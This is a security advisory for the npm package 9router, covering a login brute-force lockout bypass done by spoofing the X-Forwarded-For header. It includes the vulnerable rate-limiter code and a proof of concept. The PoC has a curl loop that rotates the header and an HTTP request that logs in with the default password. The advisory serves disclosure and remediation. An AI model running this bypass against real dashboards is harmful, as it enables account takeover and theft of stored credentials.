# [H] 9router: Login brute-force protection bypass via spoofed X-Forwarded-For header

## Summary
Severity: High
Advisory: GHSA-7cfm-pqrj-xgq7
CVE: CVE-2026-55501
CWE: CWE-290, CWE-307
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-07-06
Source: https://github.com/advisories/GHSA-7cfm-pqrj-xgq7
Type: github-advisory

## Affected
- npm: `9router` — affected >=0 <0.4.77

## Details
## Summary

The 9router dashboard login rate limiter derives the client identity from the attacker-controlled `X-Forwarded-For` HTTP header. When 9router is directly exposed, or deployed behind a reverse proxy that does not overwrite untrusted forwarding headers, a remote attacker can rotate the `X-Forwarded-For` value on each login attempt and receive a fresh rate-limit bucket every time.

This bypasses the dashboard brute-force protection and makes the login lockout mechanism ineffective.

## Details

| Component                    | File                              | Note                                                                        |
| ---------------------------- | --------------------------------- | --------------------------------------------------------------------------- |
| Dashboard login rate limiter | `src/lib/auth/loginLimiter.js`    | Uses `X-Forwarded-For` as the client identity without a trusted-proxy check |
| Dashboard login route        | `src/app/api/auth/login/route.js` | Calls `checkLock()` and `recordFail()` using the spoofable client identity  |

#### Vulnerable Code

`src/lib/auth/loginLimiter.js`:

```js
export function getClientIp(request) {
  const xff = request.headers.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  return request.headers.get("x-real-ip") || "unknown";
}
```

The returned value is used as the key for the in-memory rate-limit state:

```js
const attempts = new Map(); // ip -> { fails, lockUntil, lockLevel, lastFailAt }
```

The login route uses this value when checking and recording failed login attempts:

```js
export async function POST(request) {
  const ip = getClientIp(request);
  const lock = checkLock(ip);

  if (lock.locked) {
    return NextResponse.json(
      { error: `Too many failed attempts. Try again in ${lock.retryAfter}s.` },
      { status: 429 }
    );
  }

  // ... password validation ...

  recordFail(ip);
}
```

Because `X-Forwarded-For` is accepted directly from the request, each unique header value creates a new rate-limit bucket with zero previous failures. An attacker can therefore bypass both the 5-attempt threshold and the progressive lockout durations.

## PoC

### Step 1 — Baseline: rate limiter triggers when the client identity is stable

Send repeated failed login attempts with the same `X-Forwarded-For` value:

```http
POST /api/auth/login HTTP/1.1
Host: localhost:20128
Content-Type: application/json
X-Forwarded-For: 1.1.1.1

{"password":"wrong-password"}
```

Observed behavior:

| Attempt | Response                                              |
| ------- | ----------------------------------------------------- |
| 1       | `Invalid password. 4 attempt(s) left before lockout.` |
| 2       | `Invalid password. 3 attempt(s) left before lockout.` |
| 3       | `Invalid password. 2 attempt(s) left before lockout.` |
| 4       | `Invalid password. 1 attempt(s) left before lockout.` |
| 5       | `Too many failed attempts. Try again in 30s.`         |
| 6       | `Too many failed attempts. Try again in 30s.`         |

This confirms that the lockout logic works when all attempts are assigned to the same rate-limit bucket.

### Step 2 — Bypass: rotate `X-Forwarded-For` on each request

Send failed login attempts while changing the `X-Forwarded-For` value for every request:

```bash
for i in $(seq 1 10); do
  curl -s -X POST "http://localhost:20128/api/auth/login" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"password":"wrong-password"}'
  echo
done
```

Observed response for every request:

```json
{
  "error": "Invalid password. 4 attempt(s) left before lockout.",
  "remainingBeforeLock": 4
}
```

The counter resets to the initial state on every request, and the lockout is never triggered.

### Step 3 — Impact amplifier: default dashboard password

If the instance is still using the default dashboard password, the rate-limit bypass allows an attacker to avoid lockout while attempting to authenticate.

Example request:

```http
POST /api/auth/login HTTP/1.1
Host: localhost:20128
Content-Type: application/json
X-Forwarded-For: 99.99.99.99

{"password":"<default-dashboard-password>"}
```

Observed response on a default installation:

```http
HTTP/1.1 200 OK
Set-Cookie: auth_token=<redacted>; Path=/; HttpOnly; SameSite=lax
```

```json
{
  "success": true
}
```

The default password is an impact amplifier, not the root cause. Even if an administrator changes the password, the rate limiter remains structurally bypassable because the attacker controls the rate-limit key.

## Attack Scenario

1. A remote attacker identifies a publicly reachable 9router dashboard.
2. The attacker sends repeated login attempts to `/api/auth/login`.
3. For each attempt, the attacker changes the `X-Forwarded-For` header value.
4. 9router treats each request as a different client and assigns a fresh rate-limit bucket.
5. The attacker can continue brute-force attempts without triggering the configured lockout.
6. If the instance uses a weak or default dashboard password, the attacker can gain administrative access.

## Impact

A successful attacker can bypass the dashboard login lockout mechanism and perform unlimited brute-force attempts against the 9router dashboard password.

If authentication succeeds, the attacker can gain administrative access to the 9router dashboard and may be able to:

* Access configured provider credentials and API keys.
* Change dashboard and authentication settings.
* Disable login protection if the application allows it.
* Create persistent API keys or other long-lived access tokens.
* Modify application configuration.
* Chain the access with other server-side functionality exposed by the dashboard.

## References
- https://github.com/decolua/9router/security/advisories/GHSA-7cfm-pqrj-xgq7
- https://github.com/decolua/9router
